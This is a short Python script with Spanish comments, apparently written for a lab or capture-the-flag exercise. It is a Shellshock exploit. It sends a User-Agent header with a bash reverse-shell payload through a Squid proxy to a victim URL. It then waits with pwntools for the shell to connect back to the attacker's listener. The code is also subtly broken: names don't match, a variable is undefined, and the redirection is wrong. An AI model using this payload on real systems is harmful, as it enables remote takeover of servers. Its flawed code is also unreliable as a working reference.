import sys, signal, requests, thread
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = "url victima" #url o ip principal de donde proceden la IP por donde corre el servicio  proxy
squid_proxy = {'http': 'http:// <IP y puerto por donde corre el servicio>'}
lport = port #puerto en el que estamos a la escucha para recibir la comunicacion

def shellshoc_attack():

    headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/ip_atacante/lport 0>1'"}    #este one_liner para reverseshell de bash podría necesitar cambion dependiendo de la ruta de bash en la maquina victima ej:/usr/bin/bash, /bash unicamente, etc

    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':

    try:
        threading.Thread(target=shellshock_attack, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer la conexion")
        sys.exit(1)
    else:
        shell.interactive()